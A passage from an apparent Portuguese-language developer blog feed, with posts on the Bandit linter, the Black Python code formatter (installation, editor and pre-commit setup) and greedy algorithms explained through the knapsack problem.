&lt;p&gt;O &lt;em&gt;Bandit&lt;/em&gt; é aquela ferramenta perfeita para você ter em seu &lt;a href="https://github.com/PyCQA/bandit#version-control-integration" title="Veja como integrá-lo com o Git"&gt;&lt;em&gt;pre-commit&lt;/em&gt;&lt;/a&gt; ou em seu &lt;em&gt;CI&lt;/em&gt;. Inclusive, o &lt;a href="https://www.codacy.com/" title="The standard for automated code reviews"&gt;&lt;em&gt;Codacy&lt;/em&gt;&lt;/a&gt;, serviço super bacana que avalia a qualidade do seu código, utiliza o &lt;em&gt;Bandit&lt;/em&gt; em seu processo de análise. Com isso, fica fácil de integrá-lo ao seu processo de &lt;em&gt;Pull Request&lt;/em&gt;/&lt;em&gt;Code Review&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Um bom custo vs. benefício para o seu projeto.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/PyCQA/bandit"&gt;Github - Bandit&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="ambiente-de-desenvolvimento"></category><category term="python"></category><category term="qualidade"></category><category term="seguranca"></category><category term="bandit"></category></entry><entry><title>Deixe darem pitaco no seu código com Black</title><link href="https://klauslaube.com.br/2019/02/07/deixe-darem-pitaco-no-seu-codigo-com-black.html" rel="alternate"></link><published>2019-02-07T14:20:00-02:00</published><updated>2019-02-07T14:20:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2019-02-07:/2019/02/07/deixe-darem-pitaco-no-seu-codigo-com-black.html</id><summary type="html">&lt;p&gt;Já abordamos &lt;a href="https://klauslaube.com.br/tag/formatters.html" title="Leia mais sobre formatters"&gt;&lt;em&gt;code formatters&lt;/em&gt;&lt;/a&gt; aqui no &lt;em&gt;blog&lt;/em&gt;. Para &lt;a href="https://klauslaube.com.br/tag/javascript.html" title="Leia mais sobre Javascript"&gt;&lt;em&gt;Javascript&lt;/em&gt;&lt;/a&gt; temos o &lt;a href="https://klauslaube.com.br/2019/01/12/deixe-darem-pitaco-no-seu-codigo-com-prettier.html" title="Deixe darem pitaco no seu código com Prettier"&gt;&lt;em&gt;Prettier&lt;/em&gt;&lt;/a&gt; como solução mais famosa, e há de se reconhecer a série de vantagens no uso da mesma. Acontece que para &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; temos algumas ferramentas tão interessantes quanto, como o &lt;em&gt;autopep8&lt;/em&gt;, &lt;em&gt;yapf&lt;/em&gt; e o &lt;em&gt;Black&lt;/em&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;E é sobre o …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Já abordamos &lt;a href="https://klauslaube.com.br/tag/formatters.html" title="Leia mais sobre formatters"&gt;&lt;em&gt;code formatters&lt;/em&gt;&lt;/a&gt; aqui no &lt;em&gt;blog&lt;/em&gt;. Para &lt;a href="https://klauslaube.com.br/tag/javascript.html" title="Leia mais sobre Javascript"&gt;&lt;em&gt;Javascript&lt;/em&gt;&lt;/a&gt; temos o &lt;a href="https://klauslaube.com.br/2019/01/12/deixe-darem-pitaco-no-seu-codigo-com-prettier.html" title="Deixe darem pitaco no seu código com Prettier"&gt;&lt;em&gt;Prettier&lt;/em&gt;&lt;/a&gt; como solução mais famosa, e há de se reconhecer a série de vantagens no uso da mesma. Acontece que para &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; temos algumas ferramentas tão interessantes quanto, como o &lt;em&gt;autopep8&lt;/em&gt;, &lt;em&gt;yapf&lt;/em&gt; e o &lt;em&gt;Black&lt;/em&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;E é sobre o último que falaremos nesse &lt;em&gt;post&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Se você está interessado em um comparativo, &lt;em&gt;Kevin Peters&lt;/em&gt; escreveu um artigo bem interessante para o &lt;em&gt;Medium&lt;/em&gt; chamado &lt;a href="https://medium.com/3yourmind/auto-formatters-for-python-8925065f9505" title="Leia o artigo na íntegra"&gt;"Auto formatters for Python"&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Além do PEP 8&lt;/h2&gt;
&lt;p&gt;A motivação para usar o &lt;em&gt;Black&lt;/em&gt; é a mesma descrita no &lt;em&gt;post&lt;/em&gt; sobre &lt;em&gt;Prettier&lt;/em&gt;: Reduzir tempo discutindo &lt;em&gt;code style&lt;/em&gt;, e deixar com que uma ferramenta tome essa decisão pelo time.&lt;/p&gt;
&lt;p&gt;Em &lt;em&gt;Python&lt;/em&gt;, o caminho para chegarmos a um consenso é relativamente menor. Uma das primeiras coisas que aprendi ao iniciar a minha jornada programando com a linguagem foi seguir a &lt;a href="https://www.python.org/dev/peps/pep-0008/" title="Style Guide for Python Code"&gt;&lt;em&gt;PEP 8&lt;/em&gt;&lt;/a&gt; religiosamente. Nela estão descritas as convenções de código adotadas oficialmente, como linhas em branco, indentação, nomes, comentários, etc. Qual o motivo de perder tempo pensando em um &lt;em&gt;style guide&lt;/em&gt; para o seu projeto se isso já foi discutido e formalizado pela comunidade?&lt;/p&gt;
&lt;p&gt;Ferramentas de &lt;em&gt;linting&lt;/em&gt; como &lt;a href="https://github.com/PyCQA/pycodestyle" title="Simple Python style checker in one Python file"&gt;&lt;em&gt;pycodestyle&lt;/em&gt;&lt;/a&gt; e &lt;a href="https://github.com/PyCQA/flake8" title="Flake8 is a wrapper around PyFlakes, pycodestyle and McCabe"&gt;&lt;em&gt;flake8&lt;/em&gt;&lt;/a&gt; são essenciais e muito comuns. São elas que irão te alertar sobre possíveis quebras de estilo de código.&lt;/p&gt;
&lt;p&gt;Mas com o &lt;em&gt;Black&lt;/em&gt; vamos além...&lt;/p&gt;
&lt;h2&gt;Formatador descompromissado&lt;/h2&gt;
&lt;p&gt;O &lt;em&gt;Black&lt;/em&gt; é um &lt;em&gt;code formatter&lt;/em&gt; para &lt;em&gt;Python&lt;/em&gt;, de código aberto (&lt;a href="https://github.com/ambv/black/blob/master/LICENSE" title="The MIT License"&gt;&lt;em&gt;MIT&lt;/em&gt;&lt;/a&gt;), que tem por lema tornar a formatação "transparente", para que você possa focar no conteúdo.&lt;/p&gt;
&lt;p&gt;O time do &lt;em&gt;Black&lt;/em&gt; alega que a ferramenta é "descompromissada", mas nem por isso ela deixa de ser pretensiosa. Diretamente do &lt;a href="https://github.com/ambv/black/" title="Black no Github"&gt;repositório no &lt;em&gt;Github&lt;/em&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;By using it, you agree to cede control over minutiae of hand-formatting. In return, Black gives you speed, determinism, and freedom from pycodestyle nagging about formatting. You will save time and mental energy for more important matters.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Em outras palavras, a ferramenta segue as recomendações da &lt;em&gt;PEP 8&lt;/em&gt; e formata seu código automaticamente. Na verdade, o &lt;em&gt;coding style&lt;/em&gt; utilizado é um &lt;em&gt;subset&lt;/em&gt; da &lt;em&gt;PEP 8&lt;/em&gt;, logo, algumas regras são "manipuladas" (como &lt;a href="https://github.com/ambv/black#line-length" title="Leia na documentação do Black"&gt;&lt;em&gt;line-length&lt;/em&gt;&lt;/a&gt; e &lt;a href="https://github.com/ambv/black#strings" title="Leia na documentação do Black"&gt;aspas ao invés de apóstrofos&lt;/a&gt;) de acordo com decisões tomadas pelo time de desenvolvedores da ferramenta.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/black-walter.jpg" width="730" height="411" title="Pare de perder tempo discutindo convenção de código no code review e vá viver sua vida, como o Walter fez (gq.co.za)" alt="Pare de perder tempo discutindo convenção de código no code review e vá viver sua vida, como o Walter fez (gq.co.za)"&gt;&lt;/p&gt;
&lt;p&gt;Caso você não concorde com algumas liberdades que a ferramenta toma, é possível customizar algumas regras adotadas pelo editor. Por exemplo, se você é um usuário assíduo de &lt;em&gt;single quotes&lt;/em&gt; e não concorda com o uso de &lt;em&gt;double quotes&lt;/em&gt;, pode executar o utilitário com o argumento &lt;code&gt;--skip-string-normalization&lt;/code&gt;. Na humilde opinião de quem vos escreve, se você se pegar usando o &lt;em&gt;Black&lt;/em&gt; com muitas exceções, talvez valha a pena procurar outra ferramenta de &lt;em&gt;formatting&lt;/em&gt;, como os próprios desenvolvedores sugerem:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Pro-tip: If you're asking yourself "Do I need to configure anything?" the answer is "No". Black is all about sensible defaults.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;No terminal&lt;/h2&gt;
&lt;p&gt;Mas chega de papo, vamos ao que interessa:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pip install black
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como qualquer biblioteca &lt;em&gt;Python&lt;/em&gt;, instalamos o &lt;em&gt;Black&lt;/em&gt; através do utilitário &lt;code&gt;pip&lt;/code&gt;. Na sequência, basta executá-lo apontando qual arquivo você pretende formatar.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ black test.py
reformatted test.py
All &lt;span class="k"&gt;done&lt;/span&gt;! ✨ 🍰 ✨
&lt;span class="m"&gt;1&lt;/span&gt; file reformatted.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Também é possível passar um diretório como argumento:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ black plugins/
reformatted /Users/klaus/Workspace/blog/plugins/global_license.py
reformatted /Users/klaus/Workspace/blog/plugins/slideshare.py
All &lt;span class="k"&gt;done&lt;/span&gt;! ✨ 🍰 ✨
&lt;span class="m"&gt;2&lt;/span&gt; files reformatted, &lt;span class="m"&gt;4&lt;/span&gt; files left unchanged.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Não estranhe se a simpática fatia de bolo acima abrir o seu apetite.&lt;/p&gt;
&lt;p&gt;Customizações, embora possam ser chamadas através de parâmetros de linha de comando, também podem ser armazenadas no &lt;code&gt;pyproject.toml&lt;/code&gt; do seu projeto, como ilustra a &lt;a href="https://github.com/ambv/black#pyprojecttoml" title="Leia mais na documentação do Black"&gt;documentação oficial&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;No editor&lt;/h2&gt;
&lt;p&gt;Mas o melhor mesmo é ter o &lt;em&gt;Black&lt;/em&gt; disponível no seu editor, deixando-o trabalhar em tempo de escrita de código.&lt;/p&gt;
&lt;p&gt;Há uma vasta opção de &lt;a href="https://github.com/ambv/black#editor-integration" title="Editor integration"&gt;editores que suportam o &lt;em&gt;Black&lt;/em&gt;&lt;/a&gt;. Para o &lt;a href="https://klauslaube.com.br/tag/vim.html" title="Leia mais sobre o Vim"&gt;&lt;em&gt;Vim&lt;/em&gt;&lt;/a&gt;, continuo com a opinião do artigo &lt;a href="https://klauslaube.com.br/2017/10/15/vim-para-desenvolvimento-python.html" title="Leia o artigo na íntegra"&gt;"Vim para desenvolvimento Python"&lt;/a&gt; e recomendo a utilização do &lt;a href="https://github.com/w0rp/ale" title="Asynchronous Lint Engine for Vim"&gt;&lt;em&gt;ALE&lt;/em&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;&amp;quot; ~/.vimrc&lt;/span&gt;

Plug &lt;span class="s1"&gt;&amp;#39;w0rp/ale&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; { &lt;span class="s1"&gt;&amp;#39;do&amp;#39;&lt;/span&gt;: &lt;span class="s1"&gt;&amp;#39;pip install black&amp;#39;&lt;/span&gt; }
&lt;span class="k"&gt;call&lt;/span&gt; plug#&lt;span class="k"&gt;end&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="k"&gt;g&lt;/span&gt;:ale_fix_on_save &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="k"&gt;g&lt;/span&gt;:ale_fixers &lt;span class="p"&gt;=&lt;/span&gt; {
\   &lt;span class="s1"&gt;&amp;#39;python&amp;#39;&lt;/span&gt;: [
\       &lt;span class="s1"&gt;&amp;#39;black&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
\       &lt;span class="s1"&gt;&amp;#39;remove_trailing_lines&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
\       &lt;span class="s1"&gt;&amp;#39;trim_whitespace&amp;#39;&lt;/span&gt;
\   ]
\}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Já para o &lt;a href="https://klauslaube.com.br/tag/vscode.html" title="Leia mais sobre VS Code"&gt;&lt;em&gt;VS Code&lt;/em&gt;&lt;/a&gt;, com o &lt;a href="https://marketplace.visualstudio.com/items?itemName=ms-python.python" title="Python extension for Visual Studio Code"&gt;&lt;em&gt;plugin&lt;/em&gt; oficial para &lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;, podemos configurá-lo como ferramenta de &lt;em&gt;formatting&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;python.formatting.blackPath&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;black&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;python.formatting.provider&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;black&amp;quot;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Em todo lugar&lt;/h2&gt;
&lt;p&gt;Outra opção que deveria ser adotada, independente da utilização do &lt;em&gt;Black&lt;/em&gt; no editor, é o uso de &lt;em&gt;commit hooks&lt;/em&gt; para formatar arquivos alterados controlados via &lt;em&gt;git&lt;/em&gt;. Volto a recomendar o &lt;a href="https://pre-commit.com/" title="A framework for managing and maintaining multi-language pre-commit hooks"&gt;&lt;em&gt;pre-commit&lt;/em&gt;&lt;/a&gt; como ferramenta, e a boa notícia é que existe um &lt;em&gt;hook&lt;/em&gt; com &lt;em&gt;Black&lt;/em&gt; configurado e prontinho para uso:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;repos&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="nt"&gt;repo&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;https://github.com/ambv/black&lt;/span&gt;
&lt;span class="nt"&gt;rev&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;stable&lt;/span&gt;
&lt;span class="nt"&gt;hooks&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="nt"&gt;id&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;black&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;language_version&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;python3.7&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;É impressionante a quantidade de tempo e atrito que economizamos quando adotamos uma ferramenta como &lt;em&gt;Black&lt;/em&gt; ou &lt;em&gt;yapf&lt;/em&gt;. Discussões relacionadas a &lt;em&gt;style guide&lt;/em&gt; praticamente inexistem, e os &lt;em&gt;code reviews&lt;/em&gt; são mais focados no problema e na qualidade do código, do que com convenções.&lt;/p&gt;
&lt;p&gt;Já tive experiências ruins com &lt;em&gt;formatters&lt;/em&gt; em &lt;em&gt;Python&lt;/em&gt;, é verdade. Nem todo time ou projeto se adapta bem com esse tipo de "ferramenta impositiva", e embora os pontos positivos sejam óbvios, é na prática que você verá os negativos. Mas não me vejo mais deixando de ter esse tipo de auxílio enquanto escrevo código.&lt;/p&gt;
&lt;p&gt;É também uma forma de pensarmos na experiência dos outros desenvolvedores, que se juntarão ao projeto durante o seu ciclo de vida.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://black.readthedocs.io/en/stable/"&gt;Black - The uncompromising code formatter&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.mattlayman.com/blog/2018/python-code-black/"&gt;Matt Leyman - Consistent Python code with Black&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://code.visualstudio.com/docs/python/editing#_formatting"&gt;Visual Studio Code - Editing Python code in VS Code&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="formatters"></category><category term="editores"></category><category term="black"></category><category term="python"></category><category term="vscode"></category><category term="vim"></category></entry><entry><title>Os greedy algorithms</title><link href="https://klauslaube.com.br/2019/01/27/os-greedy-algorithms.html" rel="alternate"></link><published>2019-01-27T15:28:00-02:00</published><updated>2019-01-27T15:28:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2019-01-27:/2019/01/27/os-greedy-algorithms.html</id><summary type="html">&lt;p&gt;Quando estive revisando a disciplina de &lt;a href="https://klauslaube.com.br/tag/algoritmos.html" title="Leia mais sobre Algoritmos"&gt;algoritmos&lt;/a&gt;, me deparei com os tais "algoritmos gulosos", ou &lt;em&gt;greedy algorithms&lt;/em&gt;. Lembro que na época eu automaticamente associei o termo a soluções de baixa utilidade ou performance. Mal sabia eu que estive equivocado esse tempo todo.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Os &lt;em&gt;greedy algorithms&lt;/em&gt; são fundamentais nos estudos de …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Quando estive revisando a disciplina de &lt;a href="https://klauslaube.com.br/tag/algoritmos.html" title="Leia mais sobre Algoritmos"&gt;algoritmos&lt;/a&gt;, me deparei com os tais "algoritmos gulosos", ou &lt;em&gt;greedy algorithms&lt;/em&gt;. Lembro que na época eu automaticamente associei o termo a soluções de baixa utilidade ou performance. Mal sabia eu que estive equivocado esse tempo todo.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Os &lt;em&gt;greedy algorithms&lt;/em&gt; são fundamentais nos estudos de algoritmos e otimizações, não à toa o mundo acadêmico faz questão de mencioná-los em uma variedade de cursos de algoritmos ou de computação. Mas algumas definições podem passar uma ideia equivocada sobre o que eles realmente são, e do que são capazes.&lt;/p&gt;
&lt;h2&gt;Definição&lt;/h2&gt;
&lt;p&gt;Embora a &lt;em&gt;Wikipedia&lt;/em&gt; possua uma definição interessante sobre o assunto, foi no &lt;em&gt;GeeksforGeeks&lt;/em&gt; que &lt;a href="https://www.geeksforgeeks.org/greedy-algorithms/" title="Greedy Algorithms"&gt;encontrei uma passagem bem esclarecedora&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Greedy is an algorithmic paradigm that builds up a solution piece by piece, always choosing the next piece that offers the most obvious and immediate benefit. So the problems where choosing locally optimal also leads to global solution are best fit for Greedy.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;O &lt;em&gt;Paulo Feofiloff&lt;/em&gt; vai além em &lt;a href="https://www.ime.usp.br/~pf/analise_de_algoritmos/aulas/guloso.html" title="USP - Algoritmos gulosos"&gt;"Algoritmos gulosos"&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Para resolver um problema, um algoritmo guloso escolhe, em cada iteração, o objeto mais apetitoso que vê pela frente. (...) Um algoritmo guloso é míope: ele toma decisões com base nas informações disponíveis na iteração corrente, sem olhar as consequências que essas decisões terão no futuro. Um algoritmo guloso jamais se arrepende ou volta atrás: as escolhas que faz em cada iteração são definitivas.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;A estratégia gulosa tem por abordagem encontrar a melhor resposta para cada passo, sem se importar em resolver esse passo novamente ou com os passos seguintes, esperando como consequência um resultado global ótimo. Acabamos por ter algoritmos mais simples e intuitivos em grande parte dos casos, mas não necessariamente apresentando a melhor resposta.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/greedy-boo.jpg" width="750" height="422" title="Algoritmos gulosos são como o Maijin Boo. Gulosos em essência, mas nem por isso não eficazes (tvovermind.com)" alt="Algoritmos gulosos são como o Maijin Boo. Gulosos em essência, mas nem por isso não eficazes (tvovermind.com)"&gt;&lt;/p&gt;
&lt;p&gt;As propriedades desse paradigma podem lembrar outras formas de escrever algoritmos, portanto, é importante saber diferenciá-lo.&lt;/p&gt;
&lt;h3&gt;Greedy não é brute-force&lt;/h3&gt;
&lt;p&gt;É bom deixar claro que um algoritmo guloso não é um algoritmo de força bruta:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Greedy&lt;/em&gt; significa que o algoritmo, a cada passo, seleciona a melhor opção para aquele passo;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Brute-force&lt;/em&gt; significa que o algoritmo seleciona uma opção de uma maneira mais simples, óbvia ou direta. E que repete essa tentativa até encontrar o resultado esperado.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Greedy não é naive&lt;/h3&gt;
&lt;p&gt;Essa talvez tenha sido a origem da minha confusão. &lt;em&gt;Naive algorithms&lt;/em&gt; são de certa forma o primeiro passo para quando você está tentando resolver um problema complexo: Primeiro faça funcionar, depois faça melhor.&lt;/p&gt;
&lt;p&gt;Em uma abordagem &lt;em&gt;naive&lt;/em&gt;, não estamos necessariamente tentando resolver cada passo com a melhor opção possível, e sim tentando resolver o todo de maneira ingênua, sem nenhuma estrutura de dados rebuscada ou cálculo preparatório, e sem se preocupar com a performance do algoritmo em si.&lt;/p&gt;
&lt;h3&gt;Naive vs. Brute-force vs. Greedy&lt;/h3&gt;
&lt;p&gt;Uma maneira mais interessante de compreender como escrevemos um algoritmo com essas diferentes práticas é através do &lt;a href="https://en.wikipedia.org/wiki/Knapsack_problem" title="Leia o artigo na Wikipedia"&gt;&lt;em&gt;Knapsack Problem&lt;/em&gt;&lt;/a&gt;. Nesse famoso problema temos um conjunto de itens, cada qual com seu determinado &lt;code&gt;peso&lt;/code&gt; e &lt;code&gt;valor&lt;/code&gt;, e temos por desafio colocar o maior valor possível dentro de uma mochila com um determinado limite de peso.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Um exemplo do método &lt;em&gt;naive&lt;/em&gt; seria pegarmos os itens mais leves e colocarmos na bolsa até não haver mais espaço;&lt;/li&gt;
&lt;li&gt;Com &lt;em&gt;brute-force&lt;/em&gt;, testaríamos todas as combinações de itens até chegar ao valor máximo para o limite de peso da bolsa;&lt;/li&gt;
&lt;li&gt;Já com o paradigma &lt;em&gt;greedy&lt;/em&gt;, por intuição, pegaríamos primeiro os itens mais valiosos, até atingirmos o peso total da bolsa.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Todas as três formas chegam a um resultado. É possível afirmar que a primeira e última opção terão performance semelhantes, mas não necessariamente chegarão a um resultado ótimo. Encontrar o melhor resultado através da forma bruta, nesse problema, não é a melhor solução.&lt;/p&gt;
&lt;h2&gt;Qual o melhor uso de greedy algorithms?&lt;/h2&gt;
&lt;p&gt;Segundo o &lt;em&gt;Brilliant.org&lt;/em&gt;, se as propriedades abaixo forem verdadeiras, pode-se aplicar a abordagem &lt;em&gt;greedy&lt;/em&gt; para resolução do problema:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Uma solução global ótima pode ser atingida ao escolher a opção ótima de cada passo;&lt;/li&gt;
&lt;li&gt;Um problema tem uma subestrutura ótima se uma solução ótima para o problema global conter as soluções ótimas para os sub-problemas.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Em outras palavras:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(...) greedy algorithms work on problems for which it is true that, at every step, there is a choice that is optimal for the problem up to that step, and after the last step, the algorithm produces the optimal solution of the complete problem.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Algoritmos como &lt;a href="https://brilliant.org/wiki/huffman-encoding/" title="Leia mais no Brilliant"&gt;&lt;em&gt;Huffman Code&lt;/em&gt;&lt;/a&gt; e &lt;a href="https://brilliant.org/wiki/dijkstras-short-path-finder/" title="Leia mais no Brilliant"&gt;&lt;em&gt;Dijkstra's Shortest Path&lt;/em&gt;&lt;/a&gt; são &lt;em&gt;greedy algorithms&lt;/em&gt; famosos que cumprem muito bem o seu papel. O &lt;em&gt;GeeksforGeeks&lt;/em&gt; lista &lt;a href="https://www.geeksforgeeks.org/greedy-algorithms/" title="Leia mais no GeeksforGeeks"&gt;uma porção de outros algoritmos e problemas que utilizam o paradigma com sucesso&lt;/a&gt;. Um muito comum em entrevistas de emprego é o &lt;a href="https://www.geeksforgeeks.org/minimum-swaps-bracket-balancing/" title="Leia no GeeksforGeeks"&gt;&lt;em&gt;Minimum Swaps for Bracket Balancing&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Compreendendo a diferença entre um &lt;em&gt;greedy&lt;/em&gt; e um &lt;em&gt;naive algorithm&lt;/em&gt;, fica mais fácil entender quando utilizar uma técnica ou outra. Uma abordagem ingênua funciona bem quando estamos começando a construir o algoritmo que solucionará um problema. De forma iterativa podemos melhorá-lo, até chegar aos valores de performance desejados.&lt;/p&gt;
&lt;p&gt;Uma abordagem &lt;em&gt;greedy&lt;/em&gt; pode trazer resultados satisfatórios para a sua solução, mas nem sempre trará o melhor resultado. Caso as propriedades listadas acima se apliquem ao algoritmo que você procura, sem dúvida nenhuma é uma técnica que, além de lhe ajudar a escrever um solução mais intuitiva, te trará os resultados esperados.&lt;/p&gt;
&lt;p&gt;Se você ficou curioso sobre como resolver o &lt;em&gt;Knapsack Problem&lt;/em&gt; de forma ótima, há a opção de utilizar &lt;em&gt;Dynamic Programming&lt;/em&gt;, outro paradigma que tem certa semelhança com &lt;em&gt;greedy algorithms&lt;/em&gt;, e que vamos falar sobre em outro &lt;em&gt;post&lt;/em&gt;. Uma alternativa mais simples e intuitiva (e &lt;em&gt;greedy&lt;/em&gt;) é criar uma terceira variável que armazene &lt;code&gt;peso / valor&lt;/code&gt; e utilize esse valor no processo de ordenação (&lt;a href="https://github.com/kplaube/rosetta-lua/blob/master/rosetta/lib/knapsack.lua" title="Veja a resolução do problema em Lua"&gt;exemplo&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://brilliant.org/wiki/greedy-algorithm/"&gt;Brilliant - Greedy algorithms&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://book.huihoo.com/data-structures-and-algorithms-with-object-oriented-design-patterns-in-c++/html/page441.html"&gt;Data Structures and Algorithms with Object-Oriented Design Patterns in C++ - Brute-Force and Greedy Algorithms&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.geeksforgeeks.org/greedy-algorithms/"&gt;GeeksforGeeks - Greedy algorithms&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://smart--grid.net/cours-lessons-theory/algorithm/brute-force-naive-greedy-algorithm/"&gt;Smart Grid - Brute Force/Naive/Greedy algorithm&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/47238823/why-selection-sort-is-not-greedy"&gt;Stackoverflow - Why selection sort is not greedy?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ime.usp.br/~pf/analise_de_algoritmos/aulas/guloso.html"&gt;USP - Algoritmos gulosos&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Greedy_algorithm"&gt;Wikipedia - Greedy algorithm&lt;/a&gt;&lt;/li&gt;
